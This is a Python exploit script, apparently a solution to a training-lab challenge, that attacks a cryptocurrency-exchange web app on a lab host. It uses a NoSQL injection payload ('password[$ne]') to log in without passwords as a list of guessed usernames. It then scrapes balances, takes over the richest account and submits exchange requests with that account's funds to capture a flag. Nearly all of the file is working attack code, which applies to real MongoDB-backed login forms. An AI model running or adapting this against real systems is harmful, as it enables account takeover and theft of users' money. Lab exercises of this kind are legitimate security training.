import requests
import re
from bs4 import BeautifulSoup

BASE_URL = "http://web0x01.hbtn/a3/nosql_injection"

class NoSQLExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.current_user = None
        
    def login_bypass(self, username):
        """Login using NoSQL injection bypass"""
        print(f"[*] Attempting login bypass for: {username}")
        
        payload = {
            'username': username,
            'password[$ne]': ''
        }
        
        try:
            response = self.session.post(BASE_URL, data=payload, allow_redirects=True)
            
            if response.status_code == 200 and ("welcome" in response.text.lower() or 
                                                 "dashboard" in response.text.lower() or
                                                 "balance" in response.text.lower()):
                print(f"[+] Login successful for: {username}")
                self.current_user = username
                return True, response
            else:
                print(f"[-] Login failed for: {username}")
                return False, None
                
        except Exception as e:
            print(f"[-] Error during login: {e}")
            return False, None
    
    def extract_balance(self, html):
        """Extract balance from HTML response"""
        try:
            # Try multiple patterns
            patterns = [
                r'balance[:\s]+\$?([\d,]+\.?\d*)',
                r'\$?([\d,]+\.?\d*)\s*(?:USD|dollars?)',
                r'account[:\s]+\$?([\d,]+\.?\d*)',
                r'total[:\s]+\$?([\d,]+\.?\d*)',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    balance_str = match.group(1).replace(',', '')
                    return float(balance_str)
            
            # Try to find in specific HTML elements
            soup = BeautifulSoup(html, 'html.parser')
            balance_elem = soup.find(class_=re.compile(r'balance', re.I))
            if balance_elem:
                text = balance_elem.get_text()
                numbers = re.findall(r'[\d,]+\.?\d*', text)
                if numbers:
                    return float(numbers[0].replace(',', ''))
            
            return None
        except Exception as e:
            print(f"[-] Error extracting balance: {e}")
            return None
    
    def find_wealthy_account(self):
        """Find an account with sufficient balance"""
        usernames = [
            'admin', 'administrator', 'root', 'user', 'test',
            'trader', 'investor', 'whale', 'rich', 'vip',
            'user1', 'user2', 'user3', 'admin1', 'alice', 'bob',
            'guest', 'demo', 'john', 'jane', 'wealthy', 'premium'
        ]
        
        print("[*] Searching for accounts with sufficient balance...\n")
        
        best_account = None
        max_balance = 0
        
        for username in usernames:
            success, response = self.login_bypass(username)
            
            if success:
                balance = self.extract_balance(response.text)
                
                if balance:
                    print(f"[+] {username}: ${balance}")
                    
                    if balance > max_balance:
                        max_balance = balance
                        best_account = {
                            'username': username,
                            'balance': balance,
                            'session': self.session
                        }
                else:
                    print(f"[+] {username}: Balance unknown")
        
        return best_account
    
    def exchange_crypto(self, amount_usd):
        """Exchange USD for HBTNc"""
        print(f"\n[*] Attempting to exchange ${amount_usd} for HBTNc...")
        
        # Try to find the exchange endpoint
        exchange_urls = [
            f"{BASE_URL}/exchange",
            f"{BASE_URL}/trade",
            f"{BASE_URL}/crypto",
            BASE_URL  # Sometimes exchange is on same page
        ]
        
        for url in exchange_urls:
            try:
                # First, get the page to see the form
                response = self.session.get(url)
                
                if "exchange" in response.text.lower() or "hbtnc" in response.text.lower():
                    print(f"[+] Found exchange interface at: {url}")
                    
                    # Try different payload formats
                    payloads = [
                        {'amount': amount_usd, 'currency': 'HBTNc'},
                        {'usd': amount_usd, 'crypto': 'HBTNc'},
                        {'from': 'USD', 'to': 'HBTNc', 'amount': amount_usd},
                        {'exchange': amount_usd}
                    ]
                    
                    for payload in payloads:
                        exchange_response = self.session.post(url, data=payload)
                        
                        if "flag" in exchange_response.text.lower() or "hbtn" in exchange_response.text.lower():
                            print("[+] Exchange successful!")
                            self.extract_flag(exchange_response.text)
                            return True
                        
            except Exception as e:
                continue
        
        return False
    
    def extract_flag(self, html):
        """Extract flag from HTML"""
        print("\n[*] Searching for flag...")
        
        # Common flag patterns
        flag_patterns = [
            r'flag[:\s]+([A-Za-z0-9_{}]+)',
            r'([A-Fa-f0-9]{32,})',
            r'(HBTN\{[^}]+\})',
            r'(FLAG\{[^}]+\})',
        ]
        
        for pattern in flag_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                flag = match.group(1)
                print(f"\n[+] FLAG FOUND: {flag}")
                
                # Save to file
                with open('7-flag.txt', 'w') as f:
                    f.write(flag)
                print(f"[+] Flag saved to 7-flag.txt")
                return flag
        
        # If no pattern matched, print response for manual inspection
        print("[*] No flag pattern matched. Response content:")
        print(html[:500])
        
        return None

def main():
    print("="*60)
    print("NoSQL Injection - Cryptocurrency Exchange Challenge")
    print("="*60)
    
    exploiter = NoSQLExploiter()
    
    # Step 1: Find account with balance
    account = exploiter.find_wealthy_account()
    
    if not account:
        print("\n[-] No accounts found with balance!")
        return
    
    print(f"\n[+] Best account found: {account['username']} with ${account['balance']}")
    
    # Step 2: Exchange for HBTNc (at least 1 coin)
    # Assuming we need most of the balance to get 1 HBTNc
    if account['balance'] > 0:
        success = exploiter.exchange_crypto(account['balance'])
        
        if not success:
            print("\n[-] Automated exchange failed. Manual steps:")
            print("1. Use the session cookies to access the site")
            print("2. Navigate to the exchange/trade page")
            print("3. Exchange funds for at least 1 HBTNc")
            print(f"\nCookies: {exploiter.session.cookies}")
    else:
        print("[-] Insufficient balance to exchange")

if __name__ == "__main__":
    main()
